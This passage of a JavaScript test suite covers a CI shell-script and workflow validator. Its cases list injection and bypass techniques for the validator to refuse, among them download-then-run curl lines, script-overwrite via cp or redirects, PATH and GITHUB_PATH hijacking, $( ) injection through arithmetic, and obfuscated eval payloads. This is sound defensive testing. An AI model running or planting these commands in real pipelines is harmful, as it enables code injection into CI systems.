  evalRefused(`${P159('commands')}\ncoproc commands { :; }\neval "$commands"`);
  evalRefused(`${P159('commands')}\nexec {commands}>/dev/null\neval "$commands"`);
  evalRefused(`${P159('COPROC')}\ncoproc { :; }\neval "$COPROC"`);
});
test('FU-159 F3: a sourced file that changes directory moves the shell that sources it', () => {
  const lib = 'infrastructure/docker/postgres/lib/role-passwords.bash';
  const files = (mover) => [
    library(),
    { kind: 'shell', name: 'scripts/other.sh', text: 'true' },
    { kind: 'shell', name: 'scripts/mover.sh', text: mover },
    {
      kind: 'shell',
      name: 'infrastructure/docker/postgres/init.sh',
      text: `source scripts/mover.sh\nsource ${lib}\n`,
    },
  ];
  assert.ok(
    validateInfraImagePins(files('cd /tmp\n'), withLibrary).errors.some((e) =>
      /does not read/.test(e),
    ),
  );
  assert.deepEqual(validateInfraImagePins(files('true\n'), withLibrary).errors, []);
});

// =============================================================================
// FU-159 round 2 (PR #874 review r1): DEFAULT DENY. The probes of the review, each of which was
// approved on aa45dd88, are rows here. Where a probe could be refused for another reason, the row
// names the reason that has to refuse it (`why`), so disabling one mechanism fails its own test.
// =============================================================================
const asWorkflow = (body) =>
  workflowYaml(
    stringify({
      jobs: { a: { 'runs-on': 'x', env: { CMD: 'docker' }, steps: [{ run: body }] } },
    }),
  );
/** every error of `body` run as a CI script and as a workflow step */
const errorsBoth = (body, policy = bare, extra = []) =>
  ['shell', 'workflow'].map(
    (kind) =>
      validateInfraImagePins(
        [...extra, kind === 'shell' ? asInput('shell', body) : asWorkflow(body)],
        policy,
      ).errors,
  );
const refusesWhy = (body, why, policy = bare, extra = []) => {
  for (const errors of errorsBoth(body, policy, extra))
    assert.ok(
      errors.some((e) => why.test(e)),
      `${JSON.stringify(body)} should be refused (${why}); got ${JSON.stringify(errors)}`,
    );
};
const acceptsBoth = (body, policy = bare, extra = []) => {
  for (const errors of errorsBoth(body, policy, extra)) assert.deepEqual(errors, [], body);
};
const refusesShell = (body, why, policy = bare, extra = []) => {
  const { errors } = validateInfraImagePins([...extra, asInput('shell', body)], policy);
  assert.ok(
    errors.some((e) => why.test(e)),
    `${JSON.stringify(body)} should be refused (${why}); got ${JSON.stringify(errors)}`,
  );
};
/** a CI script only: a workflow step has no path of its own to source from or be listed by */
const acceptsShell = (body, policy = bare, extra = []) =>
  assert.deepEqual(
    validateInfraImagePins([...extra, asInput('shell', body)], policy).errors,
    [],
    body,
  );
const NOT_MODELED = /a program this check does not model/;
const scriptFile = (name, text = 'true') => ({ kind: 'shell', name, text });

test('FU-159 r2 F1: a program in no table refuses, whatever its arguments look like', () => {
  // the review’s probes
  refusesWhy('taskset 1 tools/unchecked', NOT_MODELED);
  refusesWhy(`node -e 'require("child_process").execSync("doc"+"ker ${R}")'`, NOT_MODELED);
  // wrappers the table does not model, with literal executable operands
  for (const wrapper of [
    'taskset 1',
    'chrt 1',
    'unshare -m',
    'nsenter -t 1',
    'strace',
    'gosu root',
    'su-exec root',
    'eatmydata',
    'busybox',
    'setpriv --reuid=1',
    'setarch x86_64',
    'runcon ctx',
    'numactl -N0',
    'chpst -u x',
    'tini --',
    'dumb-init',
    'bwrap --bind / /',
  ])
    refusesWhy(`${wrapper} tools/unchecked`, NOT_MODELED);
  // interpreters with code strings or unread files, and options that run a program
  for (const program of [
    'python3 -c "import os"',
    'perl -e 1',
    'ruby -e 1',
    'make -f tools/Makefile',
    "sed -n '1e docker run' f",
    'awk \'BEGIN{system("x")}\'',
    "psql -c '\\! docker run'",
    'psql -f tools/x.sql',
    'node tools/x.js',
    'go run tools/x.go',
    'sort --compress-program=tools/x f',
    'tar -cf a --to-command tools/x b',
  ])
    refusesWhy(program, NOT_MODELED);
  // a relative path without ./ is a file, not a name
  refusesWhy('tools/unchecked', /a file this check does not read/);
  // the tables stay usable: builtins, data programs, wrappers around them
  acceptsBoth('echo "$a" | grep -q x && cat f | tail -n 1 > /dev/null');
  acceptsBoth('timeout 5 sleep 1; env -u X date; nice -n 1 mkdir -p d; command -v git');
  // task 368 F4: a word that starts with an expansion may BE an option (`"$a" "$b"` = `-o scripts/lib.sh`); a URL that
  // starts with literal text and ends in an expansion is a URL
  acceptsBoth('curl -fsS "http://localhost:$port/x" -o /dev/null');
  refusesWhy('curl -fsS "$url" -o /dev/null', /curl option .* is not one this check reads/);
  // a reviewed entry names the script and the program, and goes stale when nothing runs it
  const reviewedPolicy = (programs) => ({
    ...bare,
    reviewedPrograms: new Map([['scripts/x.sh', { programs, reason: 'r' }]]),
  });
  assert.deepEqual(
    validateInfraImagePins([asInput('shell', 'node tools/x.js')], reviewedPolicy(['node'])).errors,
    [],
  );
  assert.ok(
    validateInfraImagePins([asInput('shell', 'true')], reviewedPolicy(['node'])).errors.some((e) =>
      /REVIEWED_PROGRAMS lists node in scripts\/x\.sh, which nothing runs/.test(e),
    ),
  );
  // by name only: a path is a file, and the entry does not reach another script
  refusesWhy('./node tools/x.js', /a file this check does not read/, reviewedPolicy(['node']));
  refusesWhy('timeout 5 node x.js', NOT_MODELED, {
    ...bare,
    reviewedPrograms: new Map([['scripts/y.sh', { programs: ['node'], reason: 'r' }]]),
  });
});

test('FU-159 r2 F1 + task 367: xargs and find build command lines from input or expressions; every use refuses', () => {
  const feed = "printf 'doc%s' ker |";
  for (const body of [
    ...['-I', '-rI', '-iZ', '--replace=Z', '-n1', '-0', '-r'].map((o) => `${feed} xargs ${o} echo`),
    `${feed} xargs -I% xargs -r env % ${R}`,
    'printf x | xargs taskset 1',
    'printf x | xargs env',
    'xargs',
    // FU-200 F1: the input of an xargs supplies a new find expression
    "printf '%s\\n' -exec python3 -c 'print(1)' ';' | xargs -d '\\n' find /dev/null",
    'find . -exec echo {} \\;',
    'find . -execdir cat {} \\;',
    'find . -maxdepth 1 -exec env -u FOO echo {} +',
    'find /dev/null -fprintf scripts/lib.sh x',
    'find "$@"',
    'env find . -exec true \\;',
    'timeout 5 xargs echo',
  ])
    refusesWhy(body, /(?:xargs|find) builds command lines|xargs substitutes/);
});

test('FU-159 r2 F1: a GitHub expression is text of unknown words, never a literal word', () => {
  // in the command position, as a wrapper operand, an option value, an eval or -c body
  for (const body of [
    `\${{ env.CMD }} ${R}`,
    `timeout \${{ env.CMD }} docker ${R}`,
    `sudo -u \${{ env.CMD }} true`,
    `nice -n \${{ env.CMD }} true`,
    `env \${{ env.CMD }} ${R}`,
    `eval "\${{ env.CMD }} ${R}"`,
    'eval ${{ env.CMD }}',
    `bash -c "\${{ env.CMD }} ${R}"`,
  ]) {
    const errors = errorsBoth(body)[1];
    assert.ok(errors.length > 0, `workflow: ${body}`);
  }
  // task 367 (FU-200 F1): GitHub pastes the value in before the shell parses, so it can add shell syntax:
  // only an env value without any is read; any other expression refuses, with the fix
  assert.ok(
    errorsBoth('echo "${{ github.sha }}" >> /dev/null')[1].some((e) =>
      /pasted into the script/.test(e),
    ),
  );
  const images = validateInfraImagePins([asWorkflow(`docker pull "\${{ env.CMD }}"`)], bare).errors;
  assert.ok(images.some((e) => /not pinned/.test(e)));
});

test('FU-159 r2 F2: a function exempts a call only if it is certainly the function there', () => {
  // the control: a function defined once at the top level, before its calls
  acceptsBoth('f() { echo hi; }\nf\ng() { f; }\ng');
  acceptsBoth('g() { f; }\nf() { :; }\ng'); // a call in a body counts from the first time g runs
  acceptsBoth('function f { :; }\nf');
  acceptsBoth('f() ( :; )\nf');
  // unset (also in eval and trap text, or by a computed name) ends the exemption
  for (const body of [
    'f() { :; }\nunset -f f\nf',
    'f() { :; }\nunset f\nf',
    "f() { :; }\neval 'unset -f f'\nf",
    "f() { :; }\ntrap 'unset -f f' EXIT\nf",
    'f() { :; }\nunset -f "$n"\nf',
  ])
    refusesWhy(body, NOT_MODELED);
  // a definition after the call, in a branch, in a list, in the background, in a body, in a subshell
  for (const body of [
    'f\nf() { :; }',
    'if false; then f() { :; }; fi\nf',
    'true && f() { :; }\nf',
    'f() { :; } &\nf',
    'g() { f() { :; }; }\ng\nf',
    '( f() { :; } )\nf',
    'f() { :; }\nf() { echo hi; }\nf',
    // in a group, a loop, a branch or a case arm of its own lines: the body may never run
    '{\n  f() { :; }\n}\nf',
    'if true; then\n  f() { :; }\nfi\nf',
    'while false; do\n  f() { :; }\ndone\nf',
    'case x in\n  x) f() { :; };;\nesac\nf',
    'echo hi | cat\nf() { :; } | cat\nf',
  ])
    refusesWhy(body, NOT_MODELED);
  // a call that goes around the function lookup runs the external program
  for (const call of ['command f', 'env f', 'nohup f', '/usr/bin/f', 'timeout 5 f', 'builtin f'])
    refusesWhy(`f() { :; }\n${call}`, NOT_MODELED);
  // a child shell does not have the parent's functions
  refusesWhy("f() { :; }\nbash <<'EOF'\nf\nEOF", NOT_MODELED);
  refusesWhy("f() { :; }\nbash -c 'f'", NOT_MODELED);
  // the same shell does: a substitution, eval and trap text
  acceptsBoth('f() { :; }\nx="$(f)"\ntrap f EXIT');
  // a quoted keyword and a name inside a string are no definition
  refusesWhy('"function" f { :; }\nf', NOT_MODELED);
  refusesWhy('function "f" { :; }\nf', NOT_MODELED);
  refusesWhy('"function" f || :\nf', NOT_MODELED);
  refusesWhy("echo 'f() { :; }'\nf", NOT_MODELED);
  refusesWhy('echo f() { :; }\nf', NOT_MODELED);
});

test('FU-159 r2 F2: functions of a sourced file come from the parsed source command, one path', () => {
  const defs = scriptFile('scripts/defs.sh', 'fn() { :; }');
  acceptsShell('source scripts/defs.sh\nfn', bare, [defs]);
  acceptsShell('. scripts/defs.sh\nfn', bare, [defs]);
  // a workflow step has no file of its own: it imports nothing, though the same text passes as a script
  assert.ok(
    errorsBoth('source scripts/defs.sh\nfn', bare, [defs])[1].some((e) => NOT_MODELED.test(e)),
  );
  // a call before the source, a source in a branch, after a directory change, by a string or comment
  for (const body of [
    'fn\nsource scripts/defs.sh',
    'if true; then source scripts/defs.sh; fi\nfn',
    'true && source scripts/defs.sh\nfn',
    'cd /x\nsource scripts/defs.sh\nfn',
    "echo 'x\nsource scripts/defs.sh'\nfn",
    '# source scripts/defs.sh\nfn',
    'echo source scripts/defs.sh\nfn',
    'command source scripts/defs.sh\nfn',
  ])
    refusesWhy(body, NOT_MODELED, bare, [defs]);
  // ONE resolved path: `source lib.sh` is ./lib.sh, never scripts/lib.sh as well
  refusesWhy('source lib.sh\nfn', NOT_MODELED, bare, [scriptFile('scripts/lib.sh', 'fn() { :; }')]);
  // a source that unsets or redefines
  for (const text of [
    'fn() { :; }\nunset -f fn',
    'fn() { :; }\nunset fn',
    'fn() { :; }\nfn() { x; }',
  ])
    refusesWhy('source scripts/defs.sh\nfn', NOT_MODELED, bare, [
      scriptFile('scripts/defs.sh', text),
    ]);
  // a source whose unset name is computed may have removed any function
  refusesShell('fn() { :; }\nsource scripts/b.sh\nfn', NOT_MODELED, bare, [
    scriptFile('scripts/b.sh', 'unset -f "$name"'),
  ]);
  // a source that unsets a name another file defined takes it from the file that defined it
  refusesShell('fn() { :; }\nsource scripts/b.sh\nfn', NOT_MODELED, bare, [
    scriptFile('scripts/b.sh', 'unset -f fn'),
  ]);
  refusesShell('source scripts/defs.sh\nsource scripts/b.sh\nfn', NOT_MODELED, bare, [
    defs,
    scriptFile('scripts/b.sh', 'unset fn'),
  ]);
  refusesShell('source scripts/b.sh\nfn', NOT_MODELED, bare, [
    scriptFile('scripts/b.sh', 'source scripts/defs.sh\nunset -f "$name"'),
    defs,
  ]);
  // a hash-pinned library gives only the names its entry lists
  const lib = 'infrastructure/docker/postgres/lib/role-passwords.bash';
  const entry = (functions) => ({
    ...bare,
    sourcedLibraries: new Map([
      [lib, { sha256: createHash('sha256').update('x\n').digest('hex'), reason: 'r', functions }],
    ]),
  });
  const libFile = { kind: 'library', name: lib, text: 'x\n' };
  const call = (name) => ({ kind: 'shell', name: 'scripts/y.sh', text: `source ${lib}\n${name}` });
  assert.deepEqual(validateInfraImagePins([libFile, call('listed')], entry(['listed'])).errors, []);
  assert.ok(
    validateInfraImagePins([libFile, call('other')], entry(['listed'])).errors.some((e) =>
      NOT_MODELED.test(e),
    ),
  );
});

test('FU-159 r2 F4: a function body is not ordered by the text: a directory change refuses its sources', () => {
  const lib = scriptFile('scripts/lib.sh');
  for (const body of [
    'f() { source scripts/lib.sh; }\ncd /x\nf',
    'f() { . scripts/lib.sh; }\ncd /x\nf',
    'f() { bash scripts/lib.sh; }\ncd /x\nf',
    'f() { scripts/lib.sh; }\ncd /x\nf',
    'f() { source scripts/lib.sh; }; cd /x; f',
    'function f { source scripts/lib.sh; }\ncd /x\nf',
    'f() { cd /x; scripts/lib.sh; }\nf',
    'if true; then cd /x; fi\nif true; then bash scripts/lib.sh; fi',
  ])
    refusesWhy(body, /does not read/, bare, [lib]);
  acceptsBoth('f() { source scripts/lib.sh; }\nf', bare, [lib]); // a file with no function effect
  acceptsBoth('(cd /x; true)\nsource scripts/lib.sh', bare, [lib]);
});

test('FU-159 r2 F4: what a sourced file does is read from its tokens, not its raw text', () => {
  const lib = scriptFile('scripts/lib.sh');
  for (const mover of [
    'c""d /x',
    'c\\d /x',
    'c\\\nd /x',
    "'cd' /x",
    'pushd /x',
    'chroot /x true',
    'env -C /x true',
  ])
    refusesWhy('source scripts/mv.sh\nsource scripts/lib.sh', /does not read/, bare, [
      lib,
      scriptFile('scripts/mv.sh', mover),
    ]);
  // through a quoted source, and through a source of a source
  refusesWhy('"source" scripts/mv.sh\nsource scripts/lib.sh', /does not read/, bare, [
    lib,
    scriptFile('scripts/mv.sh', 'cd /x'),
  ]);
  refusesWhy('source scripts/a.sh\nsource scripts/lib.sh', /does not read/, bare, [
    lib,
    scriptFile('scripts/a.sh', 'source scripts/b.sh'),
    scriptFile('scripts/b.sh', 'c""d /x'),
  ]);
  // a source that cannot be resolved may move
  refusesWhy('source scripts/a.sh\nsource scripts/lib.sh', /does not read/, bare, [
    lib,
    scriptFile('scripts/a.sh', 'source "$x"'),
  ]);
  // words that only mention `cd` do not move anything
  acceptsShell('source scripts/mv.sh\nsource scripts/lib.sh', bare, [
    lib,
    scriptFile('scripts/mv.sh', '# cd /y\nprintf "%s" cd'),
  ]);
});

test('FU-159 r2 F4 + task 367: find -exec/-execdir/-okdir run another program; find is refused', () => {
  const lib = scriptFile('scripts/lib.sh');
  for (const body of [
    'find . -execdir scripts/lib.sh {} \\;',
    'find . -okdir ./scripts/lib.sh {} \\;',
    'find . -execdir env scripts/lib.sh {} \\;',
    'find . -exec scripts/lib.sh {} \\;',
  ])
    refusesWhy(body, /find builds command lines/, bare, [lib]);
});

test('FU-159 r2 F4: a write that can replace a file the script sources or runs refuses', () => {
  const lib = scriptFile('scripts/lib.sh');
  const replaced = /writes scripts\/lib\.sh, a file this run sources or executes|curl option/;
  for (const writer of [
    'printf x > scripts/lib.sh',
    'printf x >> ./scripts/lib.sh',
    'printf x >scripts/lib.sh',
    'printf x 2> scripts/lib.sh',
    'printf x &> scripts/lib.sh',
    'printf x >| scripts/lib.sh',
    'printf x >& scripts/lib.sh',
    'cp tools/evil.sh scripts/lib.sh',
    'mv tools/evil.sh scripts/lib.sh',
    'ln -sf tools/evil.sh scripts/lib.sh',
    'echo x | tee scripts/lib.sh',
    'echo x | tee -a scripts/lib.sh',
    'touch scripts/lib.sh',
    'curl -o scripts/lib.sh https://x/y',
    'curl -sSLo scripts/lib.sh https://x/y',
    'curl --output=scripts/lib.sh https://x/y',
    'curl --output scripts/lib.sh https://x/y',
    'curl -c scripts/lib.sh https://x/y',
    'curl --cookie-jar scripts/lib.sh https://x/y',
    'curl -D scripts/lib.sh https://x/y',
  ])
    for (const runner of ['bash scripts/lib.sh', 'source scripts/lib.sh', 'scripts/lib.sh'])
      refusesWhy(`${writer}\n${runner}`, replaced, bare, [lib]);
  // a target this check cannot read, in a script that runs a file, needs a reviewed entry
  refusesWhy(
    'printf x > "$t"\nbash scripts/lib.sh',
    /writes to a path this check cannot read/,
    bare,
    [lib],
  );
  refusesWhy(
    'cp a "${d}/b"\nbash scripts/lib.sh',
    /writes to a path this check cannot read/,
    bare,
    [lib],
  );
  refusesWhy(
    'curl -O https://x/y\nbash scripts/lib.sh',
    /curl option -O is not one this check reads/, // task 368 F4: an allowlist, not a list of writers
    bare,
    [lib],
  );
  const entry = {
    ...bare,
    reviewedPrograms: new Map([['scripts/x.sh', { programs: [], writes: ['$t'], reason: 'r' }]]),
  };
  assert.deepEqual(
    validateInfraImagePins([lib, asInput('shell', 'printf x > "$t"\nbash scripts/lib.sh')], entry)
      .errors,
    [],
  );
  assert.ok(
    validateInfraImagePins([lib, asInput('shell', 'bash scripts/lib.sh')], entry).errors.some((e) =>
      /lists the write \$t/.test(e),
    ),
  );
  // an absolute path may be this checkout under another spelling: unreadable, like a computed one
  for (const target of ['/home/runner/work/r/r/scripts/lib.sh', '/etc/x', '//work/lib.sh'])
    refusesWhy(
      `printf x > ${target}\nbash scripts/lib.sh`,
      /writes to a path this check cannot read/,
      bare,
      [lib],
    );
  acceptsBoth('printf x > /tmp/x\nprintf x > /dev/null\nbash scripts/lib.sh', bare, [lib]);
  // harmless writes: other literal files, descriptors, and computed targets where nothing runs a file
  acceptsBoth(
    'printf x > out.txt\nprintf x >&2\necho y 2>&1\nbash scripts/lib.sh >/dev/null 2>&1',
    bare,
    [lib],
  );
  // task 370 B1: a computed target is refused wherever the script stands - the runner's env and path files are such
  // targets, and a later step runs what an earlier one wrote (the reviewed list names the exact word)
  refusesWhy('printf x > "$t"', /writes to a path this check cannot read/);
  refusesWhy('cp a "$b"', /writes to a path this check cannot read/);
  const writes = {
    ...bare,
    reviewedPrograms: new Map([['scripts/x.sh', { programs: [], writes: ['$t'], reason: 'r' }]]),
  };
  assert.deepEqual(
    validateInfraImagePins([scriptFile('scripts/x.sh', 'printf x > "$t"')], writes).errors,
    [],
  );
});

test('FU-159 r2 F4: a variable in an EXECUTED_PROGRAMS path must be read-only before the command', () => {
  const lib = scriptFile('scripts/lib.sh');
  const policy = {
    ...bare,
    executedPrograms: new Map([
      ['scripts/x.sh', { words: ['${LIB_BIN}/scripts/lib.sh'], reason: 'r' }],
    ]),
  };
  const run = '"${LIB_BIN}/scripts/lib.sh"';
  const frozen = /EXECUTED_PROGRAMS|a file this check does not read/;
  for (const body of [
    `LIB_BIN=/tmp\n${run}`,
    `LIB_BIN=/a\n${run}\nLIB_BIN=/tmp`,
    `read LIB_BIN <<< /tmp\n${run}`,
    `printf -v LIB_BIN %s /tmp\n${run}`,
    `f() { LIB_BIN=/tmp; ${run}; }\nf`,
    run,
    `${run}\nreadonly LIB_BIN=/a`,
    `if true; then readonly LIB_BIN=/a; fi\n${run}`,
    `true && readonly LIB_BIN=/a\n${run}`,
    `( readonly LIB_BIN=/a )\n${run}`,
    `LIB_BIN=/a\necho hi\nreadonly LIB_BIN\n${run}`,
    `export LIB_BIN=/a\n${run}`,
    // the declaration must run in this shell, by the builtin, in its plain form (FU-200 F4, first bullet)
    `readonly LIB_BIN=/a &\n${run}`,
    `readonly LIB_BIN=/a | cat\n${run}`,
    `readonly() { :; }\nreadonly LIB_BIN=/a\n${run}`,
    `"readonly" LIB_BIN=/a\n${run}`,
    `LIB_BIN=/a\nreadonly -f LIB_BIN\n${run}`,
    `LIB_BIN=/a\ndeclare -nr LIB_BIN\n${run}`,
    // `export` is a function: LIB_BIN was never assigned, and `readonly LIB_BIN` would freeze the inherited value
    `export() { :; }\nexport LIB_BIN=/a\nreadonly LIB_BIN\n${run}`,
  ])
    refusesWhy(body, frozen, policy, [lib]);
  acceptsShell(`readonly LIB_BIN=/a\n${run}`, policy, [lib]);
  // task 365 F2: only the plain `readonly` builtin is a freeze this check can read (binding, value and attributes)
  refusesWhy(`declare -r LIB_BIN=/a\n${run}`, frozen, policy, [lib]);
  // task 367: not a literal declaration in the preamble, so not the reviewed form
  refusesWhy(`LIB_BIN=/a\nreadonly LIB_BIN\n${run}`, frozen, policy, [lib]);
  refusesWhy(`true\nreadonly LIB_BIN=/a\n${run}`, frozen, policy, [lib]);
  refusesWhy(`readonly LIB_BIN=/a\nreadonly LIB_BIN=/b\n${run}`, frozen, policy, [lib]);
  refusesWhy(`readonly LIB_BIN="$(pwd)"\n${run}`, frozen, policy, [lib]);
  acceptsShell(`set -euo pipefail\nreadonly LIB_BIN=/a\n${run}`, policy, [lib]);
  acceptsShell(`readonly LIB_BIN=/a\nf() { ${run}; }\nf`, policy, [lib]);
  acceptsShell(`readonly LIB_BIN=/a\nx="$(${run})"`, policy, [lib]);
});

test('FU-159 r2 F4: PATH, CDPATH and hash decide which file a command name is', () => {
  for (const body of [
    'hash -p tools/unchecked cat\ncat',
    'PATH=tools:$PATH\ncat',
    'export PATH="tools:$PATH"\ncat',
    'env PATH=tools cat',
    'read PATH <<< tools\ncat',
    'unset PATH\ncat',
    'CDPATH=x\ncat',
    'declare -x PATH=tools\ncat',
    'echo "PATH=tools" >> "$GITHUB_ENV"',
  ])
    refusesWhy(body, /names PATH or CDPATH|hash binds/);
  refusesWhy('echo tools >> "$GITHUB_PATH"', /appends to GITHUB_PATH/);
  refusesWhy('printf "%s\\n" tools >> "$GITHUB_PATH"', /appends to GITHUB_PATH/);
  acceptsBoth('hash -r\necho "$PATH" > /dev/null\necho "A=b" >> "$GITHUB_ENV"');
  // a reviewed entry names the one directory a job may append
  const entry = {
    ...bare,
    reviewedPrograms: new Map([
      ['scripts/x.sh', { programs: [], paths: ['$RUNNER_TEMP/bin'], reason: 'r' }],
    ]),
  };
  assert.deepEqual(
    validateInfraImagePins([asInput('shell', 'echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"')], entry)
      .errors,
    [],
  );
  assert.ok(
    validateInfraImagePins(
      [asInput('shell', 'echo "$RUNNER_TEMP/other" >> "$GITHUB_PATH"')],
      entry,
    ).errors.some((e) => /appends to GITHUB_PATH/.test(e)),
  );
});

test('FU-159 r2 F4: the real tree is read with the reviewed tables (no stale entry, no exception left over)', () => {
  // every REVIEWED_PROGRAMS / EXECUTED_PROGRAMS entry is used by the CLI run (its stale check)
  for (const [file, entry] of REVIEWED_PROGRAMS) {
    assert.ok(entry.reason.length > 20, file);
    assert.ok(
      entry.programs.length + (entry.writes ?? []).length + (entry.paths ?? []).length > 0,
      file,
    );
  }
});

test('FU-159 r2 F1: a dispatcher whose argv this check does not rebuild is a program in no table', () => {
  for (const call of [
    'watch tools/unchecked',
    'watch taskset 1 x',
    'parallel tools/unchecked ::: x',
    'parallel {} run alpine:latest ::: docker',
    'su -c tools/unchecked',
    'script -qc tools/unchecked /dev/null',
    'at -f tools/unchecked now',
    'runuser -u x tools/unchecked',
    'sg grp tools/unchecked',
    'ssh host tools/unchecked',
    'ssh host taskset 1 x',
  ])
    refusesWhy(call, NOT_MODELED);
  // flock -c hands its operand to `sh -c`
  refusesWhy("flock l -c 'tools/unchecked'", /flock option -c is not one this check reads/);
  // the wrapper forms whose argv IS rebuilt stay readable
  acceptsBoth('flock /tmp/l sleep 1; sudo -u x true; doas true; setsid -w true');
  // sudo -i / -s / -e run a shell or an editor no operand names
  for (const option of ['-i', '-s', '-e', '--login', '--shell'])
    refusesWhy(`sudo ${option} true`, /sudo option .* is not one this check reads/);
});

test('FU-159 r2 F1: text that an arithmetic evaluation would run as a command substitution refuses', () => {
  refusesWhy('let x=1', NOT_MODELED);
  const payload = "'a[$(tools/unchecked)]'";
  for (const body of [
    `let ${payload}`,
    `[[ ${payload} -eq 1 ]]`,
    `test ${payload} -eq 1`,
    `x=${payload}; echo $((x))`,
    `declare -i x=${payload}`,
    `typeset -i x`,
    `local -i x`,
    `export -i x=1`,
    'echo "\\$(tools/unchecked)"',
    "echo `echo hi` '`x`'",
  ])
    refusesWhy(body, /holds the text \$\( or a backtick|evaluates its value as arithmetic/);
  // an awk program of a reviewed entry may use `$(NF-1)`
  assert.deepEqual(
    validateInfraImagePins([asInput('shell', "awk '{ print $(NF-1) }' f")], {
      ...bare,
      reviewedPrograms: new Map([['scripts/x.sh', { programs: ['awk'], reason: 'r' }]]),
    }).errors,
    [],
  );
  // a substitution that is a command of its own is read as one
  acceptsBoth('x="$(date)"\necho "$((x + 1))"');
});

test('FU-159 r2 F4: time -o writes its report to a file', () => {
  const lib = scriptFile('scripts/lib.sh');
  for (const timer of [
    'time -o scripts/lib.sh',
    'time -oscripts/lib.sh',
    'time --output=scripts/lib.sh',
    'time --output scripts/lib.sh',
  ])
    refusesWhy(`${timer} true\nbash scripts/lib.sh`, /writes scripts\/lib\.sh/, bare, [lib]);
});

test('FU-159 r2 F2: the splitter keeps a definition at the top level (descriptors, pipelines, nested case)', () => {
  // `>&2` is a redirection, not a background `&`; a pipeline's last stage does not pipe the next line
  acceptsBoth('f() { echo x >&2; }\nf');
  acceptsBoth('f() { echo x 2>&1; }\nf');
  acceptsBoth('echo a | cat\nf() { :; }\nf');
  acceptsBoth('echo a || true\nf() { :; }\nf');
  // an inner `esac` before `;;` ends the inner case: the outer pattern list continues
  assert.deepEqual(
    tokenizeShell('case x in x) case y in y) true;; esac;; z) true;; esac').commands.map(
      (c) => `${c.words.map((w) => w.value).join(' ')}${c.pattern ? ' (pattern)' : ''}`,
    ),
    [
      'case x in',
      'x (pattern)',
      'case y in',
      'y (pattern)',
      'true',
      'esac',
      'z (pattern)',
      'true',
      'esac',
    ],
  );
  // `>&2` stays in its command; `>|` is the clobbering redirection, `|` alone a pipe
  assert.deepEqual(
    tokenizeShell('echo x >&2').commands.map((c) => c.words.map((w) => w.value)),
    [['echo', 'x', '>&2']],
  );
  assert.deepEqual(
    tokenizeShell('printf x >| f').commands.map((c) => c.words.map((w) => w.value)),
    [['printf', 'x', '>|', 'f']],
  );
});

// =============================================================================
// FU-159 round 2 F3 (PR #874 review r1): a tracked eval trusts the VALUE of one ordinary variable,
// quoted, assigned once from the approved producer. Bash writes its own variables (`BASH_REMATCH`,
// `_`, `IFS`, `REPLY` ...) without naming them, and an unquoted expansion is split and globbed.
// =============================================================================
test('FU-159 r2 F3: the review’s probes: BASH_REMATCH, _ and an unquoted expansion under IFS', () => {
  const producer = (name) => `${name}="$(bash infra/creds.sh)"`;
  evalRefused(
    `${producer('BASH_REMATCH')}\n[[ 'do""cker run alpine:latest' =~ .+ ]]\neval "$BASH_REMATCH"`,
  );
  evalRefused(`${producer('_')}\necho 'do""cker run alpine:latest'\neval "$_"`);
  evalRefused(`${producer('commands')}; IFS="'"; eval $commands`);
  evalRefused(`${producer('commands')}\nIFS="'"\neval \${commands}`);
});

test('FU-159 r2 F3: a name bash writes by itself is not an ordinary variable', () => {
  for (const name of [
    'BASH_REMATCH',
    'BASH_COMMAND',
    '_',
    'IFS',
    'REPLY',
    'MAPFILE',
    'OPTARG',
    'OPTIND',
    'COPROC',
    'RANDOM',
    'LINENO',
    'SECONDS',
    'PIPESTATUS',
    'OLDPWD',
    'COMMANDS',
    'Commands',
  ])
    for (const argument of [`"$${name}"`, `"\${${name}}"`])
      evalRefused(`${P159(name)}\neval ${argument}`);
});

test('FU-159 r2 F3: only the word "$name" or "${name}" is a tracked eval', () => {
  for (const argument of [
    '$commands',
    '${commands}',
    "'$commands'",
    '\\$commands',
    // an unquoted expansion with a quote glued on is still split
    '$commands""',
    '${commands}""',
    "$commands''",
    '"$commands"x',
    '"${commands}x"',
    '"$commands}"',
    '"${commands"',
    '"$commands$commands"',
    '"${commands:-x}"',
    '"${commands%x}"',
    '"$(echo $commands)"',
    '-- "$commands"',
    '"$commands" "$commands"',
    '"$commands" extra',
  ])
    evalRefused(`${P159('commands')}\neval ${argument}`);
  // the quoted forms are the one shape, whatever the quoting is wrapped in
  for (const body of [
    `${P159('commands')}\neval "$commands"`,
    `${P159('commands')}\neval "\${commands}"`,
    `${P159('commands')}\neval "$commands"''`,
    `${P159('commands')}\nIFS="'"\neval "$commands"`,
    `${P159('kafka_credentials')}\neval "\${kafka_credentials}" && true`,
    `${P159('c2_x')}\n( eval "$c2_x" )`,
  ])
    assert.deepEqual(creds159(body), [], body);
});

// =============================================================================
// FU-159 round 3 (PR #896 review r1, F1–F3). The review's probes, each as a shell file AND as a
// workflow step. The trust in a tracked eval rests on what the parsed structure PROVES: one
// double-quoted expansion of the producer's name, a genuine assignment from the approved script,
// no write the check cannot read, and an interpreter that no function or alias can stand in for.
// =============================================================================
const evalRefusedBoth = (body, why = /eval runs text/) => {
  for (const kind of ['shell', 'workflow']) {
    const { errors } = validateInfraImagePins([credsFile, asInput(kind, body)], creds150);
    assert.ok(
      errors.some((e) => why.test(e)),
      `${kind}: ${body}`,
    );
  }
};
const evalAcceptedBoth = (body) => {
  for (const kind of ['shell', 'workflow'])
    assert.deepEqual(
      validateInfraImagePins([credsFile, asInput(kind, body)], creds150).errors,
      [],
      `${kind}: ${body}`,
    );
};
const PRODUCER = 'commands="$(bash infra/creds.sh tests)"';
const PAYLOAD = '\'do""cker run alpine:latest #\'';

test('FU-159 r3 F1: a word that merely reads like "$commands" after quote removal is not the tracked expansion', () => {
  const name = 'commands';
  // every split point: bash expands `comm` and appends the literal `ands`
  for (let k = 1; k < name.length; k += 1) {
    const [head, tail] = [name.slice(0, k), name.slice(k)];
    for (const argument of [
      `"$${head}""${tail}"`,
      `"\${${head}}""${tail}"`,
      `"$${head}"${tail}`,
      `"$${head}"'${tail}'`,
    ])
      evalRefusedBoth(`${PRODUCER}\n${head}=${PAYLOAD}\neval ${argument}`);
  }
  // a literal dollar is another text altogether
  for (const argument of [
    '"\\$commands"',
    '"\\${commands}"',
    '\'$commands\'""',
    "'$commands'",
    '"$commands"x',
    '$commands"x"',
    '"$commands""x"',
    '"${commands}x"',
    '"$commands"$x',
    '"$com"mands',
  ])
    evalRefusedBoth(`${PRODUCER}\neval ${argument}`);
});

test('FU-159 r3 F1: only a genuine assignment word binds the producer', () => {
